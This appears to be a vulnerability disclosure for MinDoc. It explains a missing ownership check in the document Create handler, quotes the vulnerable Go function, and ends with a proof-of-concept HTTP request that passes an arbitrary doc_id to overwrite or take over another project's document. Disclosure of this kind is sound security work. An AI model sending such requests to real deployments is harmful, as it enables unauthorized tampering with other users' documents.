@@ -1,0 +1,100 @@
+Link to Detailed Reproduction Video: https://github.com/blog-chen/MinDoc/blob/main/MinDoc2026-07-20%2023-26-47.mp4
+In the file \mindoc-master\controllers\DocumentController.go, when handling the case where doc_id > 0, the Create method first retrieves the existing document based on doc_id, then directly overwrites its BookId and MemberId with those of the current project and user. Due to the lack of ownership validation for the target document, an attacker can supply an arbitrary doc_id to modify documents belonging to other projects, or even transfer them into their own project.
+func (c *DocumentController) Create() {
+	identify := c.GetString("identify")
+	docIdentify := c.GetString("doc_identify")
+	docName := c.GetString("doc_name")
+	parentId, _ := c.GetInt("parent_id", 0)
+	docId, _ := c.GetInt("doc_id", 0)
+	isOpen, _ := c.GetInt("is_open", 0)
+
+	if identify == "" {
+		c.JsonResult(6001, i18n.Tr(c.Lang, "message.param_error"))
+	}
+
+	if docName == "" {
+		c.JsonResult(6004, i18n.Tr(c.Lang, "message.doc_name_empty"))
+	}
+
+	bookId := 0
+
+	// 如果是超级管理员则不判断权限
+	if c.Member.IsAdministrator() {
+		book, err := models.NewBook().FindByFieldFirst("identify", identify)
+		if err != nil {
+			logs.Error(err)
+			c.JsonResult(6002, i18n.Tr(c.Lang, "message.item_not_existed_or_no_permit"))
+		}
+
+		bookId = book.BookId
+	} else {
+		bookResult, err := models.NewBookResult().FindByIdentify(identify, c.Member.MemberId)
+
+		if err != nil || bookResult.RoleId == conf.BookObserver {
+			logs.Error("FindByIdentify => ", err)
+			c.JsonResult(6002, i18n.Tr(c.Lang, "message.item_not_existed_or_no_permit"))
+		}
+
+		bookId = bookResult.BookId
+	}
+
+	if docIdentify != "" {
+		if ok, err := regexp.MatchString(`[a-z]+[a-zA-Z0-9_.\-]*$`, docIdentify); !ok || err != nil {
+			c.JsonResult(6003, i18n.Tr(c.Lang, "message.project_id_tips"))
+		}
+
+		d, _ := models.NewDocument().FindByIdentityFirst(docIdentify, bookId)
+		if d.DocumentId > 0 && d.DocumentId != docId {
+			c.JsonResult(6006, i18n.Tr(c.Lang, "message.project_id_existed"))
+		}
+	}
+	if parentId > 0 {
+		doc, err := models.NewDocument().Find(parentId)
+		if err != nil || doc.BookId != bookId {
+			c.JsonResult(6003, i18n.Tr(c.Lang, "message.parent_id_not_existed"))
+		}
+	}
+
+	document, _ := models.NewDocument().Find(docId)
+
+	document.MemberId = c.Member.MemberId
+	document.BookId = bookId
+
+	document.Identify = docIdentify
+
+	document.Version = time.Now().Unix()
+	document.DocumentName = docName
+	document.ParentId = parentId
+
+	if isOpen == 1 {
+		document.IsOpen = 1
+	} else if isOpen == 2 {
+		document.IsOpen = 2
+	} else {
+		document.IsOpen = 0
+	}
+
+	if err := document.InsertOrUpdate(); err != nil {
+		logs.Error("添加或更新文档时出错 -> ", err)
+		c.JsonResult(6005, i18n.Tr(c.Lang, "message.failed"))
+	} else {
+		c.JsonResult(0, "ok", document)
+	}
+}
+
+POC:
+POST /api/test_project/create HTTP/1.1
+Host: IP
+Content-Length: 89
+X-Requested-With: XMLHttpRequest
+Accept-Language: zh-CN,zh;q=0.9
+Accept: */*
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+Origin: http://192.168.233.134:9011
+Referer: http://192.168.233.134:9011/api/test_project/edit/
+Accept-Encoding: gzip, deflate, br
+Cookie: mindoc_id=ce075ba8a81cd5c6fbf37f2694f4fe7a
+Connection: keep-alive
+
+identify=test_project&doc_id=28&parent_id=0&doc_name=test_word&doc_identify=a28&is_open=0
